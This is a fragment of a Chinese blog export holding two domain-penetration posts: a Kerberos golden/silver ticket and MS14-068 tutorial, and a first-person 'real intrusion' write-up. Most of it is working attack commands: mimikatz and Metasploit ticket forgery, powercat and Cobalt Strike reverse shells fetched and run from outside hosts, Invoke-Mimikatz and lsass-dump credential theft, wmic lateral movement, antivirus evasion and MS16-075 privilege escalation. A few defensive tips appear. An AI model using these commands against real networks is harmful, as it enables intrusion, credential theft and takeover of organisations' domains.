\\\\WIN-M34UCFJIPNQ\\c$\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/14.png)\n\nmimikatz还有另外一中方法\n\n```\nkerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /rc4:8b3955c065502e33716d555d4421a723 /user:fanxing /ptt\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/15.png)\n\n##### **CobaltStrike**\n\n在上线之后->执行->黄金票据\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/16.png)\n\n##### **Metasploit**\n\nmsf制作金票\n\n```\nload kiwi\n```\n\n生成Golden Ticket\n\n```\ngolden_ticket_create -d fanxing.com -k 8b3955c065502e33716d555d4421a723 -s S-1-5-21-3408186607-3793295459-3581146574 -u fanxing -t /tmp/golden.ticket\n```\n\n将票据导入内存中\n\n```\nkerberos_ticket_use /tmp/golden.ticket\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/17.png)\n\ndir访问目录成功\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/18.png)\n\n金票的创建，需要krbtgt的密码ntml hash，对于防御，只要定期的修改krbtgt的密码，就能使金票失效。\n\n#### **白银票据**\n\n白银票据是TGS颁发给Client的ST票据，根据kerberos协议第5步，Server会对Clinet的ST票据利用Client的hash解密，所以这个过程不需要经过KDC，而且只能访问Server的服务一次。\n\n满足一下条件，即可以伪造银票：\n\n1.域的名称\n\n2.域的SID值\n\n3.域服务的NTML Hash\n\n4.要伪造的用户名\n\n5.目标服务器的kerberos服务\n\n常用的服务名有\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/19.png)\n\n伪造银票\n\n```\nkerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /target:WIN-M34UCFJIPNQ.fanxing.com /service:cifs /rc4:dcd87fc42d9d8ac03dec5931a55ddd59 /user:fanxing /ptt\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/20.png)\n\n对于银票的防御措施可以开启PAC，PAC只能KDC制作和查看，在注册表中添加一个ValidateKdcPacSignature为1\n\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/21.png)\n\n#### **MS14-068**\n\nClient向AS申请一张不包含PAC的TGT票据，会伪造一个PAC，在TGS_REP中，对伪造的PAC验证成功后，会返回一个新的TGT票据。\n\n通过[MS14-068exp](https://github.com/abatchy17/Window**ploits/tree/master/MS14-068)利用\n\n```\nMS14-068.exe -u 当前域用户@域名称 -p 当前域用户密码 -s sid值 -d 域控ip\n```\n\nsid值通过whoami /all获取\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/22.png)\n\n然后会在目录下生成一个证书，利用mimikatz\n\n```\nkerberos::ptc C:\\wwwroot\\TGT_xxxxx@fanxing.com.ccache\n```\n\n就可以使用dir访问到域控的目录\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/23.png)\n\n对于ms14-068的防御可以打补丁KB3011780和使用winserver2012\n\n#### **参考文章**\n\n1.https://www.anquanke.com/member/143805\n\n2.https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/","tags":["内网渗透"]},{"title":"我的一次内网域渗透实战","url":"/2019/08/14/我的一次内网域渗透实战/","content":"\n#### **CobaltStrike反弹shell**\n\n通过CNVD-C-2019-48814获取到shell，由于这个网站存在ETES杀毒软件，写入jsp木马或者利用vbs，certutil，powershell下载msf木马均会被杀，这里可以利用powershell反弹shell的形式在自己的vps上获取到一个shell。具体这个漏洞怎么利用我不说了，网上很多复现文章。\n在cobaltstrike生成一段powershell代码，插入payload\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/1.png)\n\n执行payload就会在cs上获取到一个会话\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/2.png)\n\n将cobaltstrike上的会话移到metasploit上(怎么移植，网上有很多教程)\n在metasploit上接收到shell\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/3.png)\n\n#### **内网信息收集**\n\n查询域名称：net view /domain\n查询域内计算机：net view /doamin:xx\n查询域控制器时间：net time /domain\n查询域管理用户：net group \"domain admins\" /domain\n得到域控制主机名：net group \"domain controllers\" /domain\n.....\n获取域控主机名：net group \"domain controllers\" /domain\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/4.png)\n\n通过ping主机名获取域控ip地址\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/5.png)\n\n补丁情况：systeminfo\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/6.png)\n\nMS14-068打了补丁，无奈只能上mimikatz读取密码，但是有eset杀毒软件，一上传就被杀了，有没有免杀的mimikatz，幸好powershell没被拦截，通过Invoke-Mimikatz读取密码。\n\n本地nc监听本地35602端口：\n\n```shell\nnc -lvvp 35602\n```\n\n在burpsuite上执行powercat反弹shell\n\n```powershell\npowershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip地址 -p 端口 -e cmd\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/7.png)\n\nInvoke-Mimikatz读取密码\n\n```powershell\npowershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/8.png)\n\n成功读取到域控的管理员账号密码\n\n#### **拿下其他主机**\n\n有了域控账号密码，ip地址，就可以连接域控了，这里有很多种方法(ipc，wmic，p**ec，sc等等，这里我详细介绍3种方法)\n\n##### 1.IPC连接\n\nnet use \\\\ip地址\\ipc$ 密码 /user:域控主机名\\域控管理名\n将文件copy到其他服务器上：copy 1.bat \\\\ip地址\\c$\n获取服务器的时间：net time \\\\ip地址\n设置1.bat执行时间：at \\\\ip地址 获取到的服务器时间 执行文件\n删除ipc记录：net use \\\\ip\\ipc$ /del\n\n##### 2.wmic\n\n```\nwmic /node:ip地址 /user:用户名 /password:密码 process call create cmd.exe\n```\n\n##### 3.psexec\n\n```\npsexec \\\\ip地址 -u 用户名 -p 密码 cmd\n```\n\n\n这里我通过wmic来连接，由于wmic没有回显\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/9.png)\n\n可以执行powershell反弹到cobaltstrike上，在移植到msf上面\n\n```powershell\nwmic /node:ip地址 /user:用户 /password:密码 process call create \"cmd.exe /c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('cs上生成的url'))\\\"\"\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/10.png)\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/11.png)\n\n在域控中进行下信息收集，获取域成员机器\n\n```\n查询所有域控制器：dsquery server\n查询域内计算机：dsquery computer\n查询域用户：dsquery user\n查询域用户所在域组：net user 域账号 /domain\n查询域组所包含的用户：net group 域组名 /domain\n```\n\n先获取域内计算机名\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/12.png)\n\n通过PING获取域成员主机的ip地址，然后再用域管理wmic进行连接反弹shell，获取的ip如下(没包括域控和存在web漏洞的ip)\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/13.png)\n\ncobaltstrike上线0.4和0.7的主机\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/14.png)\n\n在对0.11主机进行连接时，ipc出现了错误代码86，指定的网络密码不正确。\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/15.png)\n\n应该是域管理限制了这个域用户登录这台主机，要其他域用户可能会登录，由于要system权限才可以利用mimikatz抓取密码，所以这里需要提权。\n\n#### **域控提权**\n\nsysteninfo先查看下那些补丁\n批量获取未打那些补丁\n\n```cmd\nsysteminfo>micropoor.txt&(for %i in ( KB3164038 KB3141780 ... ) do @Type micropoor.txt|@find /i \"%i\"|| @echo %i you can fuck)&del /f /q /a micropoor.txt\n```\n\n获取到 KB3164038(ms16-075)补丁没有打，metasploit提供了个exp\n\n```shell\nuse exploit/windows/local/ms16_075_reflection_juicy\nset payload windows/meterpreter/reverse_tcp\nset session 2\nset lhost ip地址\nset lport  端口\n```\n\n成功提到system权限，可以利用mimikatz读取密码了。\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/16.png)\n\n由于域控上存在eset杀软，可以通过procdump+mimikatz读取密码\n先下载procdump到域控上\n\n```cmd\ncertutil.exe -urlcache -split -f http://xxx.xxx.xxx.xxx/procdump64.exe\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/17.png)\n\n执行：\n\n```cmd\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmp\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/18.png)\n\n将lsass.dmp下载本地利用mimikatz读取出密码明文(两部操作都需要管理员权限)\n\n```cmd\n download C:/Windows/system32/lsass.dmp\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/19.png)\n\n下载到本地之后，mimikatz执行：\n\n```cmd\nmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\"  > 1.txt\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/20.png)\n\n读取到5个用户明文，这里我只给一张图吧\n最后登录0.11那个地址，由于cobaltstrike一直都不上线，我就采用的nc反弹\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/21.png)\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/22.png)","tags":["渗透测试"]}]